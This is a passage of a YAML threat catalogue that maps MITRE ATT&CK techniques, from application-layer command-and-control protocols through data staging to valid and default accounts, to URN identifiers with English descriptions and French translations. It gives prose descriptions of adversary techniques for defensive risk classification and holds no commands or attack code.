      \ with web traffic to avoid detection/network filtering by blending in with\
      \ existing traffic. Commands to the remote system, and often the results of\
      \ those commands, will be embedded within the protocol traffic between the client\
      \ and server. \n\nProtocols such as HTTP/S(Citation: CrowdStrike Putter Panda)\
      \ and WebSocket(Citation: Brazking-Websockets) that carry web traffic may be\
      \ very common in environments. HTTP/S packets have many fields and headers in\
      \ which data can be concealed. An adversary may abuse these protocols to communicate\
      \ with systems under their control within a victim network while also mimicking\
      \ normal, expected traffic.\nhttps://attack.mitre.org/techniques/T1071/001"
    translations:
      fr:
        name: Protocoles Web
        description: "Les adversaires peuvent communiquer en utilisant des protocoles\
          \ de niveau application associ\xE9s au trafic web afin d\u2019\xE9viter\
          \ la d\xE9tection ou le filtrage r\xE9seau en se fondant dans le trafic\
          \ existant. Les commandes vers le syst\xE8me distant, et souvent les r\xE9\
          sultats de ces commandes, seront int\xE9gr\xE9es dans le trafic protocolaire\
          \ entre le client et le serveur. \n\nDes protocoles tels que HTTP/S (Citation\
          \ : CrowdStrike Putter Panda) et WebSocket (Citation : Brazking-Websockets)\
          \ qui transportent le trafic web peuvent \xEAtre tr\xE8s courants dans les\
          \ environnements. Les paquets HTTP/S comportent de nombreux champs et en-t\xEA\
          tes dans lesquels les donn\xE9es peuvent \xEAtre dissimul\xE9es. Un adversaire\
          \ peut abuser de ces protocoles pour communiquer avec les syst\xE8mes sous\
          \ son contr\xF4le au sein d\u2019un r\xE9seau victime tout en imitant le\
          \ trafic normal et attendu.\nhttps://attack.mitre.org/techniques/T1071/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.002
    ref_id: T1071.002
    name: File Transfer Protocols
    description: "Adversaries may communicate using application layer protocols associated\
      \ with transferring files to avoid detection/network filtering by blending in\
      \ with existing traffic. Commands to the remote system, and often the results\
      \ of those commands, will be embedded within the protocol traffic between the\
      \ client and server. \n\nProtocols such as SMB(Citation: US-CERT TA18-074A),\
      \ FTP(Citation: ESET Machete July 2019), FTPS, and TFTP that transfer files\
      \ may be very common in environments.  Packets produced from these protocols\
      \ may have many fields and headers in which data can be concealed. Data could\
      \ also be concealed within the transferred files. An adversary may abuse these\
      \ protocols to communicate with systems under their control within a victim\
      \ network while also mimicking normal, expected traffic.\nhttps://attack.mitre.org/techniques/T1071/002"
    translations:
      fr:
        name: Protocoles de transfert de fichiers
        description: "Les adversaires peuvent communiquer en utilisant des protocoles\
          \ de niveau application associ\xE9s au transfert de fichiers pour \xE9viter\
          \ la d\xE9tection ou le filtrage r\xE9seau en se fondant dans le trafic\
          \ existant. Les commandes vers le syst\xE8me distant, et souvent les r\xE9\
          sultats de ces commandes, seront int\xE9gr\xE9es dans le trafic protocolaire\
          \ entre le client et le serveur. \n\nDes protocoles tels que SMB (Citation\
          \ : US-CERT TA18-074A), FTP (Citation : ESET Machete juillet 2019), FTPS\
          \ et TFTP qui transf\xE8rent des fichiers peuvent \xEAtre tr\xE8s courants\
          \ dans les environnements.  Les paquets produits \xE0 partir de ces protocoles\
          \ peuvent comporter de nombreux champs et en-t\xEAtes dans lesquels les\
          \ donn\xE9es peuvent \xEAtre dissimul\xE9es. Les donn\xE9es pouvaient \xE9\
          galement \xEAtre dissimul\xE9es dans les fichiers transf\xE9r\xE9s. Un adversaire\
          \ peut abuser de ces protocoles pour communiquer avec les syst\xE8mes sous\
          \ son contr\xF4le au sein d\u2019un r\xE9seau victime tout en imitant le\
          \ trafic normal et attendu.\nhttps://attack.mitre.org/techniques/T1071/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.003
    ref_id: T1071.003
    name: Mail Protocols
    description: "Adversaries may communicate using application layer protocols associated\
      \ with electronic mail delivery to avoid detection/network filtering by blending\
      \ in with existing traffic. Commands to the remote system, and often the results\
      \ of those commands, will be embedded within the protocol traffic between the\
      \ client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry\
      \ electronic mail may be very common in environments.  Packets produced from\
      \ these protocols may have many fields and headers in which data can be concealed.\
      \ Data could also be concealed within the email messages themselves. An adversary\
      \ may abuse these protocols to communicate with systems under their control\
      \ within a victim network while also mimicking normal, expected traffic.(Citation:\
      \ FireEye APT28)\nhttps://attack.mitre.org/techniques/T1071/003"
    translations:
      fr:
        name: Protocoles de courrier
        description: "Les adversaires peuvent communiquer en utilisant des protocoles\
          \ de niveau application associ\xE9s \xE0 la distribution de courrier \xE9\
          lectronique afin d\u2019\xE9viter la d\xE9tection ou le filtrage r\xE9seau\
          \ en se fondant dans le trafic existant. Les commandes vers le syst\xE8\
          me distant, et souvent les r\xE9sultats de ces commandes, seront int\xE9\
          gr\xE9es dans le trafic protocolaire entre le client et le serveur. \n\n\
          Des protocoles tels que SMTP/S, POP3/S et IMAP qui transportent le courrier\
          \ \xE9lectronique peuvent \xEAtre tr\xE8s courants dans les environnements.\
          \  Les paquets produits \xE0 partir de ces protocoles peuvent comporter\
          \ de nombreux champs et en-t\xEAtes dans lesquels les donn\xE9es peuvent\
          \ \xEAtre dissimul\xE9es. Les donn\xE9es pourraient \xE9galement \xEAtre\
          \ dissimul\xE9es dans les messages \xE9lectroniques eux-m\xEAmes. Un adversaire\
          \ peut abuser de ces protocoles pour communiquer avec les syst\xE8mes sous\
          \ son contr\xF4le au sein d\u2019un r\xE9seau victime tout en imitant le\
          \ trafic normal et attendu. (Citation : FireEye APT28)\nhttps://attack.mitre.org/techniques/T1071/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.004
    ref_id: T1071.004
    name: DNS
    description: "Adversaries may communicate using the Domain Name System (DNS) application\
      \ layer protocol to avoid detection/network filtering by blending in with existing\
      \ traffic. Commands to the remote system, and often the results of those commands,\
      \ will be embedded within the protocol traffic between the client and server.\
      \ \n\nThe DNS protocol serves an administrative function in computer networking\
      \ and thus may be very common in environments. DNS traffic may also be allowed\
      \ even before network authentication is completed. DNS packets contain many\
      \ fields and headers in which data can be concealed. Often known as DNS tunneling,\
      \ adversaries may abuse DNS to communicate with systems under their control\
      \ within a victim network while also mimicking normal, expected traffic.(Citation:\
      \ PAN DNS Tunneling)(Citation: Medium DnsTunneling)\n\nDNS beaconing may be\
      \ used to send commands to remote systems via DNS queries. A DNS beacon is created\
      \ by tunneling DNS traffic (i.e.\u202F[Protocol Tunneling](https://attack.mitre.org/techniques/T1572)).\
      \ The commands may be embedded into different DNS records, for example, TXT\
      \ or A records.(Citation: OilRig Uses Updated BONDUPDATER to Target Middle Eastern\
      \ Government) DNS beacons may be difficult to detect because the beacons infrequently\
      \ communicate with infected devices.(Citation: DNS Beacons) Infrequent communication\
      \ conceals the malicious DNS traffic with normal DNS traffic.\nhttps://attack.mitre.org/techniques/T1071/004"
    translations:
      fr:
        name: DNS
        description: "Les adversaires peuvent communiquer en utilisant le protocole\
          \ de couche application Domain Name System (DNS) afin d\u2019\xE9viter la\
          \ d\xE9tection ou le filtrage r\xE9seau en se fondant dans le trafic existant.\
          \ Les commandes vers le syst\xE8me distant, et souvent les r\xE9sultats\
          \ de ces commandes, seront int\xE9gr\xE9es dans le trafic protocolaire entre\
          \ le client et le serveur. \n\nLe protocole DNS remplit une fonction administrative\
          \ dans les r\xE9seaux informatiques et peut donc \xEAtre tr\xE8s courant\
          \ dans les environnements. Le trafic DNS peut \xE9galement \xEAtre autoris\xE9\
          \ avant m\xEAme que l\u2019authentification r\xE9seau ne soit termin\xE9\
          e. Les paquets DNS contiennent de nombreux champs et en-t\xEAtes dans lesquels\
          \ les donn\xE9es peuvent \xEAtre dissimul\xE9es. Souvent appel\xE9 tunneling\
          \ DNS, les adversaires peuvent abuser du DNS pour communiquer avec les syst\xE8\
          mes sous leur contr\xF4le au sein d\u2019un r\xE9seau victime tout en imitant\
          \ le trafic normal et attendu. (Citation : Tunnel DNS PAN)(Citation : Tunneling\
          \ Dns Moyen)\n\nLe balisage DNS peut \xEAtre utilis\xE9 pour envoyer des\
          \ commandes \xE0 des syst\xE8mes distants via des requ\xEAtes DNS. Une balise\
          \ DNS est cr\xE9\xE9e en tunnellant le trafic DNS (c\u2019est-\xE0-dire\
          \ [Protocole Tunneling](https://attack.mitre.org/techniques/T1572)). Les\
          \ commandes peuvent \xEAtre int\xE9gr\xE9es dans diff\xE9rents enregistrements\
          \ DNS, par exemple les enregistrements TXT ou A. (Citation : OilRig utilise\
          \ un BONDUPDATER mis \xE0 jour pour cibler le gouvernement du Moyen-Orient)\
          \ Les balises DNS peuvent \xEAtre difficiles \xE0 d\xE9tecter car elles\
          \ communiquent rarement avec les appareils infect\xE9s. (Citation : Balises\
          \ DNS) Une communication peu fr\xE9quente dissimule le trafic DNS malveillant\
          \ avec le trafic DNS normal.\nhttps://attack.mitre.org/techniques/T1071/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1071.005
    ref_id: T1071.005
    name: Publish/Subscribe Protocols
    description: "Adversaries may communicate using publish/subscribe (pub/sub) application\
      \ layer protocols to avoid detection/network filtering by blending in with existing\
      \ traffic. Commands to the remote system, and often the results of those commands,\
      \ will be embedded within the protocol traffic between the client and server.\
      \ \n\nProtocols such as <code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>,\
      \ and <code>STOMP</code> use a publish/subscribe design, with message distribution\
      \ managed by a centralized broker.(Citation: wailing crab sub/pub)(Citation:\
      \ Mandiant APT1 Appendix) Publishers categorize their messages by topics, while\
      \ subscribers receive messages according to their subscribed topics.(Citation:\
      \ wailing crab sub/pub) An adversary may abuse publish/subscribe protocols to\
      \ communicate with systems under their control from behind a message broker\
      \ while also mimicking normal, expected traffic.\nhttps://attack.mitre.org/techniques/T1071/005"
    translations:
      fr:
        name: Protocoles de publication/abonnement
        description: "Les adversaires peuvent communiquer en utilisant des protocoles\
          \ de niveau application publish/subscribe (pub/sub) afin d\u2019\xE9viter\
          \ la d\xE9tection ou le filtrage r\xE9seau en se fondant dans le trafic\
          \ existant. Les commandes vers le syst\xE8me distant, et souvent les r\xE9\
          sultats de ces commandes, seront int\xE9gr\xE9es dans le trafic protocolaire\
          \ entre le client et le serveur. \n\nDes protocoles tels que <code>MQTT</code>,\
          \ <code>XMPP</code>, <code>AMQP</code> et <code>STOMP</code> utilisent un\
          \ design publish/subscribe, avec une distribution des messages g\xE9r\xE9\
          e par un courtier centralis\xE9. (Citation : sous-titre / pub crabe hurlant)(Citation\
          \ : Mandiant APT1 Annexe) Les \xE9diteurs classent leurs messages par sujet,\
          \ tandis que les abonn\xE9s re\xE7oivent des messages selon les sujets auxquels\
          \ ils sont abonn\xE9s. (Citation : sous-titre / pub crabe hurlant) Un adversaire\
          \ peut abuser des protocoles de publication/abonnement pour communiquer\
          \ avec les syst\xE8mes sous son contr\xF4le depuis l\u2019arri\xE8re d\u2019\
          un courtier de messages tout en imitant le trafic normal et attendu.\nhttps://attack.mitre.org/techniques/T1071/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1072
    ref_id: T1072
    name: Software Deployment Tools
    description: "Adversaries may gain access to and use centralized software suites\
      \ installed within an enterprise to execute commands and move laterally through\
      \ the network. Configuration management and software deployment applications\
      \ may be used in an enterprise network or cloud environment for routine administration\
      \ purposes. These systems may also be integrated into CI/CD pipelines. Examples\
      \ of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft\
      \ Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide\
      \ or enterprise-wide endpoint management software may enable an adversary to\
      \ achieve remote code execution on all connected systems. The access may be\
      \ used to laterally move to other systems, gather information, or cause a specific\
      \ effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration\
      \ management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)\
      \ on cloud-hosted instances, as well as the execution of arbitrary commands\
      \ on on-premises endpoints. For example, Microsoft Configuration Manager allows\
      \ Global or Intune Administrators to run scripts as SYSTEM on on-premises devices\
      \ joined to Entra ID.(Citation: SpecterOps Lateral Movement from Azure to On-Prem\
      \ AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001)\
      \ to communicate back to adversary owned infrastructure.(Citation: Mitiga Security\
      \ Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices\
      \ may also have configuration management tools that can be similarly abused\
      \ by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected\
      \ Chinese Actor in Espionage Operation)\n\nThe permissions required for this\
      \ action vary by system configuration; local credentials may be sufficient with\
      \ direct access to the third-party system, or specific domain credentials may\
      \ be required. However, the system may require an administrative account to\
      \ log in or to access specific functionality.\nhttps://attack.mitre.org/techniques/T1072"
    translations:
      fr:
        name: "Outils de d\xE9ploiement logiciel"
        description: "Les adversaires peuvent acc\xE9der et utiliser des suites logicielles\
          \ centralis\xE9es install\xE9es au sein d\u2019une entreprise pour ex\xE9\
          cuter des commandes et se d\xE9placer lat\xE9ralement dans le r\xE9seau.\
          \ La gestion de configuration et les applications de d\xE9ploiement logiciel\
          \ peuvent \xEAtre utilis\xE9es dans un environnement r\xE9seau d\u2019entreprise\
          \ ou cloud \xE0 des fins d\u2019administration courante. Ces syst\xE8mes\
          \ peuvent \xE9galement \xEAtre int\xE9gr\xE9s dans les pipelines CI/CD.\
          \ Parmi ces solutions, on trouve : SCCM, HBSS, Altiris, AWS Systems Manager,\
          \ Microsoft Intune, Azure Arc et GCP Deployment Manager.  \n\nL\u2019acc\xE8\
          s \xE0 des logiciels de gestion de terminaux \xE0 l\u2019\xE9chelle du r\xE9\
          seau ou de l\u2019entreprise peut permettre \xE0 un adversaire d\u2019ex\xE9\
          cuter du code \xE0 distance sur tous les syst\xE8mes connect\xE9s. L\u2019\
          acc\xE8s peut \xEAtre utilis\xE9 pour se d\xE9placer lat\xE9ralement vers\
          \ d\u2019autres syst\xE8mes, recueillir des informations ou provoquer un\
          \ effet sp\xE9cifique, comme effacer les disques durs sur tous les points\
          \ de terminaison.\n\nLes services de gestion de configuration bas\xE9s sur\
          \ SaaS peuvent permettre une large [Cloud Administration Command](https://attack.mitre.org/techniques/T1651)\
          \ sur des instances h\xE9berg\xE9es dans le cloud, ainsi que l\u2019ex\xE9\
          cution de commandes arbitraires sur des points de terminaison locaux. Par\
          \ exemple, Microsoft Configuration Manager permet aux administrateurs Global\
          \ ou Intune d\u2019ex\xE9cuter des scripts en tant que SYST\xC8ME sur des\
          \ appareils locaux reli\xE9s \xE0 Entra ID. (Citation : SpecterOps Lateral\
          \ Movement from Azure to On-Prem AD 2020) Ces services peuvent \xE9galement\
          \ utiliser [Web Protocols](https://attack.mitre.org/techniques/T1071/001)\
          \ pour communiquer vers l\u2019infrastructure d\xE9tenue par l\u2019adversaire.\
          \ (Citation : Mitiga Security Advisory : Agent SSM comme cheval de Troie\
          \ d\u2019acc\xE8s distant)\n\nLes dispositifs d\u2019infrastructure r\xE9\
          seau peuvent \xE9galement disposer d\u2019outils de gestion de configuration\
          \ qui peuvent \xEAtre abus\xE9s de la m\xEAme mani\xE8re par leurs adversaires.\
          \ (Citation : Fortinet Zero-Day et malware personnalis\xE9 utilis\xE9 par\
          \ un acteur chinois pr\xE9sum\xE9 dans une op\xE9ration d\u2019espionnage)\n\
          \nLes permissions requises pour cette action varient selon la configuration\
          \ du syst\xE8me ; Les identifiants locaux peuvent suffire avec un acc\xE8\
          s direct au syst\xE8me tiers, ou des identifiants sp\xE9cifiques de domaine\
          \ peuvent \xEAtre exig\xE9s. Cependant, le syst\xE8me peut n\xE9cessiter\
          \ un compte administrateur pour se connecter ou acc\xE9der \xE0 certaines\
          \ fonctionnalit\xE9s.\nhttps://attack.mitre.org/techniques/T1072"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1074
    ref_id: T1074
    name: Data Staged
    description: 'Adversaries may stage collected data in a central location or directory
      prior to Exfiltration. Data may be kept in separate files or combined into one
      file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560).
      Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      and bash may be used to copy data into a staging location.(Citation: PWC Cloud
      Hopper April 2017)


      In cloud environments, adversaries may stage data within a particular instance
      or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002)
      and stage data in that instance.(Citation: Mandiant M-Trends 2020)


      Adversaries may choose to stage data from a victim network in a centralized
      location prior to Exfiltration to minimize the number of connections made to
      their C2 server and better evade detection.

      https://attack.mitre.org/techniques/T1074'
    translations:
      fr:
        name: Data Staging
        description: "Les adversaires peuvent organiser les donn\xE9es collect\xE9\
          es dans un lieu central ou un annuaire avant l\u2019Exfiltration. Les donn\xE9\
          es peuvent \xEAtre conserv\xE9es dans des fichiers s\xE9par\xE9s ou combin\xE9\
          es en un seul fichier gr\xE2ce \xE0 des techniques telles que [Archive Collected\
          \ Data](https://attack.mitre.org/techniques/T1560). Des shells de commandes\
          \ interactifs peuvent \xEAtre utilis\xE9s, et des fonctionnalit\xE9s courantes\
          \ dans [cmd](https://attack.mitre.org/software/S0106) et bash peuvent \xEA\
          tre utilis\xE9es pour copier les donn\xE9es dans un emplacement de staging.\
          \ (Citation : PWC Cloud Hopper avril 2017)\n\nDans les environnements cloud,\
          \ les adversaires peuvent mettre en place les donn\xE9es dans une instance\
          \ ou une machine virtuelle particuli\xE8re avant l\u2019exfiltration. Un\
          \ adversaire peut [Cr\xE9er une instance cloud](https://attack.mitre.org/techniques/T1578/002)\
          \ et \xE9tablir des donn\xE9es dans cette instance. (Citation : Mandiant\
          \ M-Trends 2020)\n\nLes adversaires peuvent choisir de mettre en place les\
          \ donn\xE9es d\u2019un r\xE9seau victime dans un lieu centralis\xE9 avant\
          \ l\u2019Exfiltration afin de minimiser le nombre de connexions vers leur\
          \ serveur C2 et d\u2019\xE9viter mieux la d\xE9tection.\nhttps://attack.mitre.org/techniques/T1074"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1074.001
    ref_id: T1074.001
    name: Local Data Staging
    description: 'Adversaries may stage collected data in a central location or directory
      on the local system prior to Exfiltration. Data may be kept in separate files
      or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560).
      Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      and bash may be used to copy data into a staging location.


      Adversaries may also stage collected data in various available formats/locations
      of a system, including local storage databases/repositories or the Windows Registry.(Citation:
      Prevailion DarkWatchman 2021)

      https://attack.mitre.org/techniques/T1074/001'
    translations:
      fr:
        name: "Mise en sc\xE8ne locale des donn\xE9es"
        description: "Les adversaires peuvent placer les donn\xE9es collect\xE9es\
          \ dans un emplacement central ou un annuaire du syst\xE8me local avant l\u2019\
          Exfiltration. Les donn\xE9es peuvent \xEAtre conserv\xE9es dans des fichiers\
          \ s\xE9par\xE9s ou combin\xE9es en un seul fichier gr\xE2ce \xE0 des techniques\
          \ telles que [Archive Collected Data](https://attack.mitre.org/techniques/T1560).\
          \ Des shells de commandes interactifs peuvent \xEAtre utilis\xE9s, et des\
          \ fonctionnalit\xE9s courantes dans [cmd](https://attack.mitre.org/software/S0106)\
          \ et bash peuvent \xEAtre utilis\xE9es pour copier les donn\xE9es dans un\
          \ emplacement de staging.\n\nLes adversaires peuvent \xE9galement organiser\
          \ les donn\xE9es collect\xE9es dans divers formats ou emplacements disponibles\
          \ d\u2019un syst\xE8me, y compris des bases de donn\xE9es/d\xE9p\xF4ts de\
          \ stockage locaux ou le Registre Windows. (Citation : Prevailion DarkWatchman\
          \ 2021)\nhttps://attack.mitre.org/techniques/T1074/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1074.002
    ref_id: T1074.002
    name: Remote Data Staging
    description: 'Adversaries may stage data collected from multiple systems in a
      central location or directory on one system prior to Exfiltration. Data may
      be kept in separate files or combined into one file through techniques such
      as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive
      command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106)
      and bash may be used to copy data into a staging location.


      In cloud environments, adversaries may stage data within a particular instance
      or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002)
      and stage data in that instance.(Citation: Mandiant M-Trends 2020)


      By staging data on one system prior to Exfiltration, adversaries can minimize
      the number of connections made to their C2 server and better evade detection.

      https://attack.mitre.org/techniques/T1074/002'
    translations:
      fr:
        name: "Mise en sc\xE8ne de donn\xE9es \xE0 distance"
        description: "Les adversaires peuvent mettre en place les donn\xE9es collect\xE9\
          es sur plusieurs syst\xE8mes dans un emplacement central ou un r\xE9pertoire\
          \ sur un m\xEAme syst\xE8me avant l\u2019Exfiltration. Les donn\xE9es peuvent\
          \ \xEAtre conserv\xE9es dans des fichiers s\xE9par\xE9s ou combin\xE9es\
          \ en un seul fichier gr\xE2ce \xE0 des techniques telles que [Archive Collected\
          \ Data](https://attack.mitre.org/techniques/T1560). Des shells de commandes\
          \ interactifs peuvent \xEAtre utilis\xE9s, et des fonctionnalit\xE9s courantes\
          \ dans [cmd](https://attack.mitre.org/software/S0106) et bash peuvent \xEA\
          tre utilis\xE9es pour copier les donn\xE9es dans un emplacement de staging.\n\
          \nDans les environnements cloud, les adversaires peuvent mettre en place\
          \ les donn\xE9es dans une instance ou une machine virtuelle particuli\xE8\
          re avant l\u2019exfiltration. Un adversaire peut [Cr\xE9er une instance\
          \ cloud](https://attack.mitre.org/techniques/T1578/002) et \xE9tablir des\
          \ donn\xE9es dans cette instance. (Citation : Mandiant M-Trends 2020)\n\n\
          En mettant en place les donn\xE9es sur un syst\xE8me avant l\u2019Exfiltration,\
          \ les adversaires peuvent minimiser le nombre de connexions vers leur serveur\
          \ C2 et mieux \xE9viter la d\xE9tection.\nhttps://attack.mitre.org/techniques/T1074/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078
    ref_id: T1078
    name: Valid Accounts
    description: 'Adversaries may obtain and abuse credentials of existing accounts
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
      Defense Evasion. Compromised credentials may be used to bypass access controls
      placed on various resources on systems within the network and may even be used
      for persistent access to remote systems and externally available services, such
      as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation:
      volexity_0day_sophos_FW) Compromised credentials may also grant an adversary
      increased privilege to specific systems or access to restricted areas of the
      network. Adversaries may choose not to use malware or tools in conjunction with
      the legitimate access those credentials provide to make it harder to detect
      their presence.


      In some cases, adversaries may abuse inactive accounts: for example, those belonging
      to individuals who are no longer part of an organization. Using these accounts
      may allow the adversary to evade detection, as the original account user will
      not be present to identify any anomalous activity taking place on their account.(Citation:
      CISA MFA PrintNightmare)


      The overlap of permissions for local, domain, and cloud accounts across a network
      of systems is of concern because the adversary may be able to pivot across accounts
      and systems to reach a high level of access (i.e., domain or enterprise administrator)
      to bypass access controls set within the enterprise.(Citation: TechNet Credential
      Theft)

      https://attack.mitre.org/techniques/T1078'
    translations:
      fr:
        name: Comptes valides
        description: "Les adversaires peuvent obtenir et abuser des identifiants des\
          \ comptes existants afin d\u2019obtenir un acc\xE8s initial, une persistance,\
          \ une escalade de privil\xE8ge ou une \xE9vasion de d\xE9fense. Les identifiants\
          \ compromis peuvent \xEAtre utilis\xE9s pour contourner les contr\xF4les\
          \ d\u2019acc\xE8s plac\xE9s sur diverses ressources des syst\xE8mes du r\xE9\
          seau et peuvent m\xEAme servir \xE0 des acc\xE8s persistants \xE0 des syst\xE8\
          mes distants et \xE0 des services externes, tels que les VPN, Outlook Web\
          \ Access, les dispositifs r\xE9seau et le bureau \xE0 distance. (Citation\
          \ : volexity_0day_sophos_FW) Des identifiants compromis peuvent \xE9galement\
          \ accorder \xE0 un adversaire un privil\xE8ge accru sur certains syst\xE8\
          mes ou un acc\xE8s \xE0 des zones restreintes du r\xE9seau. Les adversaires\
          \ peuvent choisir de ne pas utiliser de logiciels malveillants ou d\u2019\
          outils en lien avec l\u2019acc\xE8s l\xE9gitime que ces identifiants offrent\
          \ afin de rendre plus difficile la d\xE9tection de leur pr\xE9sence.\n\n\
          Dans certains cas, les adversaires peuvent abuser des comptes inactifs :\
          \ par exemple, ceux appartenant \xE0 des personnes qui ne font plus partie\
          \ d\u2019une organisation. L\u2019utilisation de ces comptes peut permettre\
          \ \xE0 l\u2019adversaire d\u2019\xE9chapper \xE0 la d\xE9tection, car l\u2019\
          utilisateur original du compte ne sera pas pr\xE9sent pour identifier toute\
          \ activit\xE9 anormale se d\xE9roulant sur son compte. (Citation : CISA\
          \ MFA PrintNightmare)\n\nLe chevauchement des autorisations pour les comptes\
          \ locaux, de domaine et cloud \xE0 travers un r\xE9seau de syst\xE8mes est\
          \ pr\xE9occupant, car l\u2019adversaire peut \xEAtre capable de pivoter\
          \ entre comptes et syst\xE8mes pour atteindre un niveau d\u2019acc\xE8s\
          \ \xE9lev\xE9 (c\u2019est-\xE0-dire administrateur de domaine ou d\u2019\
          entreprise) afin de contourner les contr\xF4les d\u2019acc\xE8s mis en place\
          \ au sein de l\u2019entreprise. (Citation : Vol de dipl\xF4me TechNet)\n\
          https://attack.mitre.org/techniques/T1078"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.001
    ref_id: T1078.001
    name: Default Accounts
    description: "Adversaries may obtain and abuse credentials of a default account\
      \ as a means of gaining Initial Access, Persistence, Privilege Escalation, or\
      \ Defense Evasion. Default accounts are those that are built-into an OS, such\
      \ as the Guest or Administrator accounts on Windows systems. Default accounts\
      \ also include default factory/provider set accounts on other types of systems,\
      \ software, or devices, including the root user account in AWS, the root user\
      \ account in ESXi, and the default service account in Kubernetes.(Citation:\
      \ Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat\
      \ Matrix for Kubernetes)\n\nDefault accounts are not limited to client machines;\
      \ rather, they also include accounts that are preset for equipment such as network\
      \ devices and computer applications, whether they are internal, open source,\
      \ or commercial. Appliances that come preset with a username and password combination\
      \ pose a serious threat to organizations that do not change it post installation,\
      \ as they are easy targets for an adversary. Similarly, adversaries may also\
      \ utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004)\
      \ or credential materials to legitimately connect to remote environments via\
      \ [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit\
      \ SSH Module)\n\nDefault accounts may be created on a system after initial setup\
      \ by connecting or integrating it with another application. For example, when\
      \ an ESXi server is connected to a vCenter server, a default privileged account\
      \ called `vpxuser` is created on the ESXi server. If a threat actor is able\
      \ to compromise this account\u2019s credentials (for example, via [Exploitation\
      \ for Credential Access](https://attack.mitre.org/techniques/T1212) on the vCenter\
      \ host), they will then have access to the ESXi server.(Citation: Google Cloud\
      \ Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation: Pentera vCenter Information\
      \ Disclosure)\nhttps://attack.mitre.org/techniques/T1078/001"
    translations:
      fr:
        name: "Comptes par d\xE9faut"
        description: "Les adversaires peuvent obtenir et abuser des identifiants d\u2019\
          un compte par d\xE9faut comme moyen d\u2019obtenir un acc\xE8s initial,\
          \ de la persistance, de l\u2019escalade de privil\xE8ges ou de l\u2019\xE9\
          vasion de la d\xE9fense. Les comptes par d\xE9faut sont ceux int\xE9gr\xE9\
          s \xE0 un syst\xE8me d\u2019exploitation, comme les comptes Invit\xE9 ou\
          \ Administrateur sur les syst\xE8mes Windows. Les comptes par d\xE9faut\
          \ incluent \xE9galement les comptes par d\xE9faut d\u2019usine/de fournisseurs\
          \ sur d\u2019autres types de syst\xE8mes, logiciels ou appareils, y compris\
          \ le compte utilisateur root dans AWS, le compte utilisateur root dans ESXi,\
          \ et le compte de service par d\xE9faut dans Kubernetes. (Citation : Microsoft\
          \ Local Accounts, f\xE9vrier 2019)(Citation : AWS Root User)(Citation :\
          \ Matrice de menaces pour Kubernetes)\n\nLes comptes par d\xE9faut ne sont\
          \ pas limit\xE9s aux machines clients ; ils incluent plut\xF4t des comptes\
          \ pr\xE9d\xE9finis pour des \xE9quipements tels que les dispositifs r\xE9\
          seau et les applications informatiques, qu\u2019ils soient internes, open\
          \ source ou commerciaux. Les appliances qui sont pr\xE9d\xE9finies avec\
          \ une combinaison de nom d\u2019utilisateur et de mot de passe repr\xE9\
          sentent une menace s\xE9rieuse pour les organisations qui ne le modifient\
          \ pas apr\xE8s l\u2019installation, car elles sont des cibles faciles pour\
          \ un adversaire. De m\xEAme, les adversaires peuvent \xE9galement utiliser\
          \ des [Cl\xE9s priv\xE9es](https://attack.mitre.org/techniques/T1552/004)\
          \ ou des documents d\u2019accr\xE9ditation divulgu\xE9s publiquement ou\
          \ vol\xE9s pour se connecter l\xE9gitimement \xE0 des environnements distants\
          \ via [Services \xE0 distance](https://attack.mitre.org/techniques/T1021).\
          \ (Citation : Module Metasploit SSH)\n\nLes comptes par d\xE9faut peuvent\
          \ \xEAtre cr\xE9\xE9s sur un syst\xE8me apr\xE8s une configuration initiale\
          \ en le connectant ou en l\u2019int\xE9grant \xE0 une autre application.\
          \ Par exemple, lorsqu\u2019un serveur ESXi est connect\xE9 \xE0 un serveur\
          \ vCenter, un compte privil\xE9gi\xE9 par d\xE9faut appel\xE9 \xAB vpxuser\
          \ \xBB est cr\xE9\xE9 sur le serveur ESXi. Si un acteur malveillant parvient\
          \ \xE0 compromettre les identifiants de ce compte (par exemple, via [Exploitation\
          \ for Credential Access](https://attack.mitre.org/techniques/T1212) sur\
          \ l\u2019h\xF4te vCenter), il aura alors acc\xE8s au serveur ESXi. (Citation\
          \ : Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)(Citation\
          \ : Divulgation d\u2019information Pentera vCenter)\nhttps://attack.mitre.org/techniques/T1078/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1078.002
    ref_id: T1078.002
    name: Domain Accounts
    description: 'Adversaries may obtain and abuse credentials of a domain account
      as a means of gaining Initial Access, Persistence, Privilege Escalation, or
